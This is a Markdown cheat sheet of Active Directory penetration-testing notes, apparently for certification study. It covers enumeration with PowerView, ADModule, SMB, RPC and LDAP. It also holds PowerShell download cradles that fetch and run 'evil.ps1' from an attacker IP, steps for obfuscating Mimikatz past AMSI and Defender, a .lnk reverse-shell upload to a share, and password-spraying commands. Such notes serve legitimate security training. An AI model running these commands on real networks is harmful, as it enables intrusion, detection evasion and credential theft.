# Active Directory

## Index

- [Notes](#notes)
- [Initial foothold](#initial-foothold)
- [Manual Enumeration](#manual-enumeration)
  - [Legacy Windows applications](#legacy-windows-applications)
  - [PowerShell and .NET](#powershell-and-net)
  - [PowerView](#powerview)
  - [ADModule](#admodule)
  - [Invoke-SessionHunter](#invoke-sessionhunter)
  - [From a compromised machine](#from-a-compromised-machine)
  - [More enumeration](#more-enumeration)
- [SMB](#smb)
- [RPC](#rpc)
- [Azure](#azure)
- [LDAP](#ldap)
- [PsLoggedOn](#psloggedon)
- [Service Principal Names Enumeration](#service-principal-names-enumeration)
- [Object Permissions Enumeration=](#object-permissions-enumeration)
- [Domain Shares Enumeration](#domain-shares-enumeration)
- [SharpHound](#sharphound)
- [BloodHound](#bloodhound)
- [Mimikatz](#mimikatz)
- [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
  - [Password Attacks](#password-attacks)
  - [Silver Tickets](#silver-tickets)
  - [Domain Controller Synchronization (DCSync)](#domain-controller-synchronization-dcsync)
  - [LDAP Pass-back attack](#ldap-pass-back-attack)
  - [ZeroLogon](#zerologon)
  - [Responder SSRF](#responder-ssrf)
  - [LAPS and PXE](#laps-and-pxe)
  - [LLMNR Poisoning](#llmnr-poisoning)
  - [SMB Relay](#smb-relay)
  - [IPv6 DNS Attacks](#ipv6-dns-attacks)
  - [MFP Hacking](#mfp-hacking)
  - [Dump hashes](#dump-hashes)
  - [Microsoft password automation decrypt](#microsoft-password-automation-decrypt)
  - [Full control / Write privileges over a template (ESC4)](#full-control--write-privileges-over-a-template-esc4)
  - [WriteDACL](#writedacl)
  - [Azure AD (AAD) Sync service](#azure-ad-aad-sync-service)
  - [Group Policy Preferences (GPP) AKA MS14-025](#group-policy-preferences-gpp-aka-ms14-025)
  - [Dump NTDS.dit](#dump-ntdsdit)
  - [Exploiting Domain Trust](#exploiting-domain-trust)
  - [AddMember + ForceChangePassword](#addmember--forcechangepassword)
  - [Automated Relays](#automated-relays)
  - [GenericAll](#genericall)
  - [Kerberos Delegation](#kerberos-delegation)
  - [Kerberos Backdoors / Kerberos Skeleton](#kerberos-backdoors--kerberos-skeleton)
  - [Testing found credentials](#testing-found-credentials)
- [Lateral Movement Techniques and Pivoting](#lateral-movement-techniques-and-pivoting)
  - [WMI and WinRM](#wmi-and-winrm)
  - [Remotely Creating Services Using sc](#remotely-creating-services-using-sc)
  - [Creating Scheduled Tasks Remotely](#creating-scheduled-tasks-remotely)
  - [Spawn process remotely](#spawn-process-remotely)
  - [Backdooring .vbs Scripts](#backdooring-vbs-scripts)
  - [Backdooring .exe Files](#backdooring-exe-files)
  - [RDP hijacking](#rdp-hijacking)
  - [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
  - [SSH Local Port Forwarding (to expose attacker's port 80)](#ssh-local-port-forwarding-to-expose-attackers-port-80)
  - [Port Forwarding With socat](#port-forwarding-with-socat)
  - [Dynamic Port Forwarding and SOCKS](#dynamic-port-forwarding-and-socks)
  - [Rejetto HFS](#rejetto-hfs)
  - [PsExec](#psexec)
  - [Extracting Credentials from LSASS](#extracting-credentials-from-lsass)
  - [Pass the Hash](#pass-the-hash)
  - [Pass the Key / Overpass-the-Hash](#pass-the-key--overpass-the-hash)
  - [Pass the Ticket](#pass-the-ticket)
  - [DCOM](#dcom)
- [Credentials Harvesting](#credentials-harvesting)
  - [Cedential Access](#cedential-access)
  - [Windows Credentials](#windows-credentials)
  - [Dump LSASS](#dump-lsass)
  - [Accessing Credential Manager](#accessing-credential-manager)
  - [Domain Controller](#domain-controller)
  - [Local Administrator Password Solution (LAPS)](#local-administrator-password-solution-laps)
  - [Rubeus Harvesting](#rubeus-harvesting)
- [Offensive .NET](#offensive-net)
  - [String Manipulation](#string-manipulation)
- [Active Directory Persistence](#active-directory-persistence)
  - [Golden Ticket](#golden-ticket)
  - [Diamond ticket](#diamond-ticket)
  - [Skeleton Key](#skeleton-key)
  - [Shadow copies](#shadow-copies)
  - [Through Credentials](#through-credentials)
  - [Through Certificates](#through-certificates)
  - [Trough SID History](#trough-sid-history)
  - [Trough metasploit](#trough-metasploit)
  - [DSRM](#dsrm)
  - [Custom SSP](#custom-ssp)
  - [ACLs - AdminSDHolder](#acls---adminsdholder)
  - [ACLs - Rights Abuse](#acls---rights-abuse)
  - [ACLs - Security Descriptors](#acls---security-descriptors)
- [Active Directory Privilege Escalation](#active-directory-privilege-escalation)
  - [Kerberoasting](#kerberoasting)
  - [Targeted Kerberoasting](#targeted-kerberoasting)
  - [Unconstrained Delegation](#unconstrained-delegation)
  - [Constrained delegation](#constrained-delegation)
  - [Resource-based Constrained Delegation](#resource-based-constrained-delegation)
  - [Child to Parent using Trust Tickets](#child-to-parent-using-trust-tickets)
  - [Child to Parent using krbtgt hash](#child-to-parent-using-krbtgt-hash)
  - [Across Forest using Trust Tickets](#across-forest-using-trust-tickets)
  - [Across domain trusts - Active Directory Certificate Services (AD CS)](#across-domain-trusts---active-directory-certificate-services-ad-cs)
- [Trust Abuse](#trust-abuse)
  - [MSSQL Servers](#mssql-servers)
- [MDE - EDR](#mde---edr)


## Notes

| Server | Algorithm available |
| ---    | ---                 |
| Windows 2003 | NTLM |
| Windows Server 2008 or later | NTLM and SHA-1 |
| - Old Windows OS (like Windows 7)<br/> - OS that have it manually set | [WDigest](https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx) |

When you compromise a Domain Controller, you want to be able to get the ntds.dit file
- Contains password hashes
- ticket attack, pass the hash attack, crack the password etc
- generally stored in %SystemRoot%\NTDS


**Cheat sheets**
- [cheatsheet-active-directory.md](https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md)
- [Cheat Sheet - Active Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
- [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [HackTricks Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Section 18: Active Directory Attacks](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-18-active-directory-attacks)
- [Pentesting_Active_directory mindmap](https://web.archive.org/web/20220607072235/https://www.xmind.net/m/5dypm8/)
- [WADComs](https://wadcoms.github.io/)

**Common Terminology**
- AD Component: trees, forest, domain tree, domain forest
  https://techiepraveen.wordpress.com/2010/09/04/basic-active-directory-components/
- https://tryhackme.com/room/attackingkerberos  Task 1
- More resources:
  https://tryhackme.com/room/attackingkerberos  Task 9

**ACEs**
- ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
- AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
- GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
- The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`


**Services that can be configured for delegation**
- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.


**Basics commands**
- Perform a password reset
  - `Set-ADAccountPassword <UserName> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose`
- Make user change password next logon
  - `Set-ADUser -ChangePasswordAtLogon $true -Identity <UserName> -Verbose`

**Work with modules and scripts**

Import a `.psd1` script (get all the commands from a module with `Get-Command -module <name-module>`)
- `Import-Module script.psd1`
- `iex (New-Object Net.WebClient).DownloadString('https://<IP>/payload.ps1')`
- `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://<IP>/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
- PSv3 onwards: `iex(iwr 'http://<IP>/evil.ps1')`
- `$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://<IP>/evil.ps1',$false);$h.send();iex $h.responseText`
- `$wr = [System.NET.WebRequest]::Create("http://<IP>/evil.ps1")`<br/>
  `$r = $wr.GetResponse()`<br/>
  `IEX (System.IO.StreamReader).ReadToEnd()`

PowerShell Detections
- System-wide transcription
- Script Block logging
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

PowerShell Detections bypass
- Use [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell
- [AMSITrigger](https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected as malicious: `AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1`
- [DefenderCheck](https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag: `DefenderCheck.exe PowerUp.ps1`
- For full obfuscation of PowerShell scripts, see [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

Steps to avoid signature based detection:
1. Scan using AMSITrigger
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"

For Mimikatz, make the following changes:
1. Remove default comments
2. Rename the script, function names and variables
3. Modify the variable names of the Win32 API calls that are detected
4. Obfuscate PEBytes content → PowerKatz dll using packers (tool: [ProtectMyTooling](https://github.com/mgeeky/ProtectMyTooling))
5. Implement a reverse function for PEBytes to avoid any static signatures
6. Add a sandbox check to waste dynamic analysis resources
7. Remove Reflective PE warnings for a clean output
8. Use obfuscated commands for Invoke-MimiEx execution
9. Analysis using DefenderCheck

**Avoid Detections**
- Running an exe from a remote server will trigger windows defender. One way to avoid this is port forwarding in 8080 `$null | winrs -r:<remote-server> "netsh interface portproxy add v4tov4 listenport=8080 listen address=0.0.0.0 connectport=80 connectaddress=<IP>"`.
  - Now you can run an exe like this `$ null | winrs -r:<remote-server> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa:ekeys exit`
  - To check if the port forwarding is still active `netsh interface portproxy show v4tov4`

**Good OPSEC**
- It’s better to use a Windows OS to increase stealth and flexibility.
- Always make sure to use a LDAP based tools, never .NET commands (SAMR)
- Always enumerate first, do not grab the low hanging fruit first, since it may be a decoy. Also check logon count and login policy.
  - An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dorment user.
  - Check: logonCount, lastlogontimestamp, badpasswordtime, Description
  - Take also in consideration your target organization: is this their first assesment? Do they invest in their security (time, effort)?
- Making changes to the local administrator group is one of the noisiest things you can do
- Domain Admin privilege is something that you should never go for
- In a real Red Team operation, you will not use a Golden Ticket unless you want to check for detections of it. This because it’s noisy
- LSAdump is really noisy, be careful
- Silver Ticket is better than Golden Ticket as we are not talking with the DC and for this reason there is no detection. The persistence is limited tho.

**Misc notes**
- Check for `Domain Admins` and `Service Accounts` groups
- Add an account to a group
  - `net group "<group>" <user> /add /domain`
  - Verify the success of the command with `Get-NetGroup "<group>" | select member`
  - Delete the `<user>` with `/del` instead of `/add`
- Use `gpp-decrypt` to decrypt a given GPP encrypted string
- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#bbject-permissions-enumeration)
  - See: [ActiveDirectoryRights Enum (System.DirectoryServices)](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- If you get lost, check also the notes for the Hutch, Heist, and Vault machines
- File config for responder: `/usr/share/responder/Responder.conf`
- Do password spray only on local account
  - `Rubeus.exe brute /password:Password1 /noticket`
    - Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
    - `echo 10.10.187.139 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
- Kerberos Abuse: https://blog.spookysec.net/kerberos-abuse/
- To transfer files use smbserver: `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
- Certificate signing request for WinRM: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
  - WinRM shell: https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
- NTLM Auth: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#beyond-root---ntlm-auth
- Not all the usernames found are always the ones that work. For example: you might find autologon creds `svc_loanmanager:Moneymakestheworldgoround!` which however lead to login with `evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`
- Every time that you think about Active Directory, think about a Forest, not a Domain. If one domain is compromised, so it is the entire forest. Whithin a forest, all the domains trust each others. This is why a forest is considered a security boundry.


## Initial foothold
- run `responder` + `mitm6`
- `enum4linux -a -u "" -p "" <IP>`
- `nmap -Pn -T4 -p- --min-rate=1000 -sV -vvv <IP> -oN nmap_results`
- `nmap -p- -A -nP <IP> -oN nmap_results`
- `dig @<IP> AXFR <domain>`
- `dnsenum <IP>`
- After this
  - [ ] 53, zone transfer + info collection
  - [ ] 139/445 Check SMB / smbclient
    - check upload of web shells / phishing
    - check eternal blue
    - check default creds
  - [ ] 389 Check ldapsearch
    - use windapsearch.py
    - try LDAP Pass-back attack
  - [ ] Check rpcclient
  - [ ] Check all services in scope, like web vulnerabilities, ftp etc.
  - [ ] Enumerate any AS-REP / Kerberos roastable users
  - [ ] Check ZeroLogon
  - [ ] Check every section of this file
  - [ ] Check default creds
    - also in Printers, Jenkins etc.
  - [ ] Check: 
    - https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff
    - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
    - https://wadcoms.github.io/ <# interactive cheat-sheet #>
    - https://github.com/seeu-inspace/easyg
  - [ ] 464 kpasswd -> try Kerberoast
  - [ ] Test NFS -> port 111, 2049 (see even if nmap doesn't mark it as NFS)
  - [ ] If you don't find something here, see exploitaiton-notes
  - [ ] Check kerberoasting
    - Not only kerbrute etc., try also to retrieve TGS ticket
    - Test AS-REP roasting and Kerberoasting
    - AS-REP, Kerberost, Rubeus (con e senza creds)
  - [ ] If you find creds / hashes, try:
    - crackmapexec to see a reuse of creds
    - evil-winrm
    - kerberoasting impacket-GetUserSPNs
      - AS-REP, Kerberost, Rubeus
    - enum4linux (once without auth and only once with creds)
      - see descriptions
    - smbclient
    - ldap
- PrivEsc / Post Access
  - [ ] enumerate with bloodhound, powershell, powerview
  - [ ] Check privileges
    - whoami /priv, Get-ADUser -identity s.smith -properties *
  - [ ] try access with rdp
  - [ ] mimikatz.exe
  - [ ] test creds already found
    - crackmapexec, ldap with auth, enum4linux (see descriptions), smbclient
    - kerberoast (AS-REP, Kerberost, Rubeus, etc. -> retrieve TGS)
    - secrets dump, impacket-psexec, impacket-wmiexec, evil-winrm
    - test also hashes
  - [ ] Azure
  - [ ] Play with Rubeus
  - [ ] See DCSync (try with various tools, come aclpwn)
  - [ ] See all sections of this document
  - [ ] See powershell history
  - [ ] Run Seatbelt first, then winPEAS


## Manual Enumeration

### Legacy Windows applications

```
net user /domain                       display users in the domain
net user <username> /domain            net-user against a specific user
net group /domain                      enumerate groups in the domain
net group "<group-name>" /domain       display members in specific group
```

### PowerShell and .NET

```
LDAP://host[:port][/DistinguishedName]                                      LDAP path format. CN = Common Name; DC = Domain Component;
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()       domain class from System.DirectoryServices.ActiveDirectory namespace
powershell -ep bypass                                                       bypass the execution policy
([adsi]'').distinguishedName                                                obtain the DN for the domain
```

### PowerView

```
Misc
----
Import-Module <module_path>                                                                                                                Import the required module
Get-NetDomain                                                                                                                              Obtain domain information
Get-NetUser | select cn,pwdlastset,lastlogon                                                                                               Obtain users in the domain; username only
Get-NetGroup | select cn                                                                                                                   Obtain groups in the domain
Get-NetGroup "<group_name>" | select member                                                                                                Enumerate a specific group
Get-NetComputer                                                                                                                            Enumerate the computer objects in the domain
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion                                                                Display OS and hostname
Find-LocalAdminAccess                                                                                                                      Scan domain to find local administrative privileges for our user
Get-NetSession -ComputerName <computer_name> -Verbose                                                                                      Check logged on users with Get-NetSession
Get-Acl -Path <registry_path> | fl                                                                                                         Display permissions on the specified registry hive
Get-NetUser -SPN                                                                                                                           Kerberoastable users
Get-ADGroupMember '<group_name>'                                                                                                           Get details about a group, in this case, '<group_name>'
Get-NetUser | select Description                                                                                                           Enumerate the domain users descriptions
Get-NetGroup -GroupName '*<keyword>*'                                                                                                      Enumerate the domain groups containing the keyword
Get-NetComputer -fulldata | select operatingsystem                                                                                         Find all operating systems running
Get-DomainPolicyData                                                                                                                       Retrieve domain policy for the current domain
(Get-DomainPolicyData).systemaccess                                                                                                        Retrieve domain policy for the current domain
(Get-DomainPolicyData -domain <domain_name>).systemaccess                                                                                  Retrieve domain policy for another domain
Get-DomainController                                                                                                                       Retrieve domain controllers for the current domain
Get-DomainController -Domain <domain_name>                                                                                                 Retrieve domain controllers for another domain
Get-DomainGroup '*<keyword>*'                                                                                                              Retrieve all groups containing the keyword in group name
Get-DomainGroupMember -Identity "<group_name>" -Recurse                                                                                    Retrieve all the members of the specified group
Get-DomainGroup -UserName "<username>"                                                                                                     Retrieve the group membership for a user
Get-NetLocalGroup -ComputerName <computer_name>                                                                                            List all the local groups on a machine
Get-NetLocalGroupMember -ComputerName <computer_name> -GroupName Administrators                                                            Retrieve members of the local group "Administrators" on a machine
Get-NetLoggedon -ComputerName <computer_name>                                                                                              Retrieve actively logged users on a computer
Get-LoggedonLocal -ComputerName <computer_name>                                                                                            Retrieve locally logged users on a computer
Get-LastLoggedOn -ComputerName <computer_name>                                                                                             Retrieve the last logged user on a computer
Invoke-FileFinder -Verbose                                                                                                                 Find sensitive files on computers in the domain
Get-NetFileServer                                                                                                                          Get all fileservers of the domain
Get-DomainGPOLocalGroup                                                                                                                    Retrieve GPO(s) using Restricted Groups or groups.xml for interesting users
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity <computer_identity>                                                               Retrieve users in local group of a machine using GPO
Get-DomainGPOUserLocalGroupMapping -Identity <username> -Verbose                                                                           Retrieve machines where the given user is a member of a specific group
Get-DomainOU                                                                                                                               Retrieve OUs in a domain
Get-DomainGPO -Identity "<gpo_id>"                                                                                                         Retrieve GPO applied on an OU
Find-LocalAdminAccess -Verbose                                                                                                             Find all machines where the current user has local admin access
Find-DomainUserLocation -CheckAccess                                                                                                       Find computers where a domain admin session is available and current user has admin access
Find-DomainUserLocation -Stealth                                                                                                           Find computers where a domain admin session is available


Get details, in this case, about user svc__apache
-------------------------------------------------
Get-ADServiceAccount -Filter {name -eq '<service_account_name>'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
Get-DomainUser -LDAPFilter "Description=*<keyword>*" | Select name,Description                                                               Check for non-empty descriptions of domain users


Object Permissions Enumeration
------------------------------
Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll


Domain Shares Enumeration
-------------------------
Find-DomainShare
Invoke-ShareFinder -verbose


Get a list of users in the current domain
-----------------------------------------
Get-DomainUser
Get-DomainUser -Identity <user>


Get list of all properties for users in the current domain
----------------------------------------------------------
Get-DomainUser -Identity <user> -Properties *
Get-DomainUser -Properties samaccountname,logonCount


Get a list of computers in the current domain
----------------------------------------------
Get-DomainComputer | select Name
Get-DomainComputer -OperatingSystem "*Server 2022*"
Get-DomainComputer -Ping


Get all the groups in the current domain
----------------------------------------
Get-DomainGroup | select Name
Get-DomainGroup -Domain <targetdomain>


Get list of GPO in current domain
---------------------------------
Get-DomainGPO
Get-DomainGPO -ComputerIdentity <computer_identity>


ACL Enumeration
---------------
Get-DomainObjectAcl -SamAccountName <user> -ResolveGUIDs                                                                                                    Retrieve the ACLs associated with the specified object
Get-DomainObjectAcl -SearchBase "LDAP://<search_base>" -ResolveGUIDs -Verbose                                                                               Retrieve the ACLs associated with the specified prefix to be used for search
(Get-Acl 'AD:<path>').Access                                                                                                                                Enumerate ACLs using ActiveDirectory module but without resolving GUIDs
Find-InterestingDomainAcl -ResolveGUIDs                                                                                                                     Search for interesting ACEs
Get-PathAcl -Path "<file_path>"                                                                                                                             Retrieve the ACLs associated with the specified path


Get a list of all domain trusts for the current domain
------------------------------------------------------
Get-DomainTrust
Get-DomainTrust -Domain <domain_name>


Forest mapping
--------------
Get-Forest                                   Retrieve details about the current forest, specify a Forest with -Forest domain.local
Get-ForestDomain                             Retrieve all domains in the current forest, specify a Forest with -Forest domain.local
Get-ForestGlobalCatalog                      Retrieve all global catalogs for the current forest, specify a Forest with -Forest domain.local
Get-ForestTrust                              Map trusts of a forest, specify a Forest with -Forest domain.local


Find computers where a domain admin, a specified user or group has sessions
---------------------------------------------------------------------------
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "RDPUsers"

```
- See also [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993), [HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview) and [HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### [ADModule](https://github.com/samratashok/ADModule)

```
Import it
---------
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1


Misc
----
Get-ADDomainController                                                                                     Retrieve domain controllers for the current domain
Get-ADDomainController -DomainName <domain_name> -Discover                                                 Retrieve domain controllers for another domain
Get-ADUser -Filter 'Description -like "*<keyword>*"' -Properties Description | select name,Description     Check for non-empty descriptions of domain users
Get-ADGroup -Filter 'Name -like "*<keyword>*"' | select Name                                               Retrieve all groups containing the keyword in group name
Get-ADGroupMember -Identity "<group_name>" -Recursive                                                      Retrieve all the members of the specified group
Get-ADPrincipalGroupMembership -Identity <username>                                                        Retrieve the group membership for a user


Get a list of users in the current domain
-----------------------------------------
Get-ADUser -Filter * -Properties *                                             Retrieve all user objects with all properties
Get-ADUser -Identity <user_identity> -Properties *                             Retrieve user object with all properties for a specific user



Get list of all properties for users in the current domain
----------------------------------------------------------
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}


Get a list of computers in the current domain
----------------------------------------------
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}


Get all the groups in the current domain
----------------------------------------
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *


Get a list of all domain trusts for the current domain
------------------------------------------------------
Get-ADTrust
Get-ADTrust -Identity <trust_identity>


Forest mapping
--------------
Get-ADForest                                                            Retrieve details about the current forest
Get-ADForest -Identity <forest_identity>                                Retrieve details about a specific forest
(Get-ADForest).Domains                                                  Retrieve all domains in the current forest
Get-ADForest | select -ExpandProperty GlobalCatalogs                    Retrieve all global catalogs for the current forest
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'             Map trusts of a forest
```

### [Invoke-SessionHunter](https://github.com/Leo4j/Invoke-SessionHunter)
```
Invoke-SessionHunter -FailSafe
Invoke-SessionHunter -NoPortScan -Targets C:\Documents\servers.txt
```


### From a compromised machine
MMC
  1. Search Bar > Type `mmc` and press enter
  2. See the steps for this app in https://tryhackme.com/room/adenumeration Task 3
Command Prompt
  - `net user /domain`
  - `net user <username> /domain`
  - `net group /domain`
  - `net group "<group_name>" /domain`
  - `net accounts /domain`
PowerShell
- `Get-ADUser -Identity <user_identity> -Server <server> -Properties *`
- `Get-ADUser -Filter 'Name -like "*<name_pattern>"' -Server <server> | Format-Table Name,SamAccountName -A`
- `Get-ADGroup -Identity <group_identity> -Server <server> -Properties *`
- `Get-ADGroupMember -Identity <group_identity> -Server <server>`
- `Get-ADGroupMember -Identity "<group_name>" | Select-Object Name, SamAccountName, DistinguishedName`
- `$ChangeDate = New-Object DateTime(<year>, <month>, <day>, <hour>, <minute>, <second>)`
- `Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server <server>`
- `Get-ADObject -Filter 'badPwdCount -gt 0' -Server <server>`
- `Get-ADDomain -Server <server>`
- `Set-ADAccountPassword -Identity <user_identity> -Server <server> -OldPassword (ConvertTo-SecureString -AsPlaintext "<old_password>" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "<new_password>" -Force)`

### More enumeration

**AD User**
- `Get-ADUser -identity <username> -properties *`
- If part of Audit Share, see the share `NETLOGON`
- Check the value in `ScriptPath`, they should be available in `NETLOGON`

**Kerberos user enumeration**
- `/home/kali/Documents/windows-attack/active_directory/kerbrute/kerbrute_linux_amd64 userenum -d <domain_name> --dc <dc_ip> usernames.txt`

**Server Manager**
- See event logs with: Event Viewer
- Navigate to the tools tab and select the Active Directory Users and Computers

**Misc**
Always enumerate first, do not grab the low hanging fruit first, since it might be a decoy. Also check logon count and login policy.
- An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dorment user.
- Check: `logonCount`, `lastlogontimestamp`, `badpasswordtime`, `Description`
- Take also in consideration your target organization: is this their first assesment? Do they invest in their security (time, effort)?


## SMB
enumeration
- `enum4linux -a -u "" -p "" <IP>`
- `enum4linux -a -u "Guest" -p "" <IP>`
- `sudo nmap -vvv -p 137 -sU --script=nbstat.nse <IP>`
- `nmap -vvv -p 139,445 --script=smb* <IP>`
- `crackmapexec smb <IP> -u 'guest' -p ''`
- `crackmapexec smb <IP> -u '' -p '' --shares`
  - see anon logins
  - use flags `--shares` and `--rid-brute`
- `crackmapexec smb <IP> -u 'guest' -p ''`
  - see anon logins
  - use flags `--shares` and `--rid-brute` (`SidTypeUser` are users)
- `smbmap -H <IP>`
- `smbclient \\\\\\<IP>\\`
- `smbclient -U '' -L \\\\\\<IP>\\`
- `smbclient --no-pass -L //<IP>`
- `smbclient -L //<IP> -N`
- `impacket-lookupsid <domain>/<username>@<IP> > usernames.txt`
- `cat usernames.txt | grep -i user | awk -F \\'{print $$2}' | awk '{print $1}'`

connect to share
- `smbclient //<IP>/IPC$`
- `smbclient \\\\\\<IP>\\<share_name>`
- `smbclient //<IP>/<share_name> -U <domain>/<username>`
- If you find a suspicious share, try to upload a lnk file
  - create a shortcut with the command for a reverse shell with `powercat.ps1`
  - `cp link.lnk \\\\\\<IP>\\<share_name>`

mount a share
- `mount -t cifs "//<IP>/<share_name>" /mnt`
  `mount -t cifs -o username=<username>,password=<password> "//<IP>/<share_name>" /mnt`
  - from the mounted share, see write perms:
    `find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done`
  - see deleted files:
    `touch {/mnt/ZZ_ARCHIVE/,./}0xdf.{lnk,exe,dll,ini}`

exploitation
- check if this smb hosts files of the web service, it might be possible to upload a shell
- maybe it's possible to do phishing
- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 <IP>`
  - CVE-2017-0143 EternalBlue
  
change password
- If you find 'STATUS_PASSWORD_MUST_CHANGE': `smbpasswd -r <IP> -U <username>`
- Alternative: `impacket-smbpasswd -newpass <new_password> <username>:<old_password>@<IP>`


## RPC
- `rpcclient <IP> -N`
- `rpcclient <IP> -U <username>`
- `rpcclient -U "" -N <IP>`
- Commands: `enumdomusers`, `enumdomgroups`, `querydispinfo`
  - `cat rpc_dump | awk '{print $1}' | cut -f2 -d [ | cut -f1 -d ] > ad_users.txt`
  - After `enumdomusers`, notes the `rid` values, then
    `queryuser RID-HERE`, example `queryuser 0x1f4`
- `impacket-rpcdump @<IP>`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
- Reset password: (see for `svc_helpdesk` accounts)
  `setuserinfo2 <username> 23 <new_password>`


## Azure
- https://blog.xpnsec.com/azuread-connect-for-redteam/
- https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html


## LDAP

- `ldapsearch -v -x -b "DC=<domain>,DC=<local>" -H "ldap://<IP>" "(objectclass=*)"`
  - check descriptions (you might find passwords in descriptions), enumerate users
